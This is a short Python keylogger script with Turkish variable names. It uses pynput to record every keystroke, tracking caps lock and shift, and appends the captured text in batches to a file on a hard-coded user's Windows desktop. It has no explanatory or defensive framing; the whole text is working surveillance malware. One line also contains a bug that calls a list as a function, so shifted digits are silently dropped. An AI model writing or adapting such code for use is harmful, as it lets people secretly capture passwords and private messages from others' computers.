from pynput.keyboard import Listener,Key

liste=list()
capsdurum=False
shftdurum=False
shftliste=["=","!","'","^","+","%","&","/","(",")"]
rakam="0123456789"

def bas(key):
    global liste,capsdurum,shftdurum

    try:
        if shftdurum:
            if key.char in rakam:
                liste.append(shftliste(int(key.char)))
            else:
                if key.char=="*":
                    liste.append("?")
                elif key.char=="-":
                    liste.append("_")
                else:
                    if not capsdurum:
                        liste.append(key.char.upper())
                    else:
                        liste.append(key.char)                

        elif capsdurum:
            liste.append(key.char.upper())

        else:
            liste.append(key.char)       

                 
        
    except:
        if key==Key.space:
            liste.append(" ")

        if key==Key.enter:
            liste.append("\n")

        if key==Key.backspace:
            liste.append("'<'")

        if key==Key.caps_lock:
            if capsdurum:
                capsdurum=False

            else:
                capsdurum=True



    if len(liste)>=30:
        dosya_yaz()
        liste=list()

    if key==Key.shift_l or key==Key.shift_r:
        shftdurum=True

def birak(key):

    global shftdurum

    if key==Key.shift_l or key==Key.shift_r:
        shftdurum=False


def dosya_yaz():
    global liste

    with open("C:/Users/Casper/Desktop/KEY.txt","a", encoding="utf8") as dosya:
        for x in liste:
            dosya.write(x)
            
with Listener(on_press=bas, on_release=birak) as dinleyici: 
    dinleyici.join()

   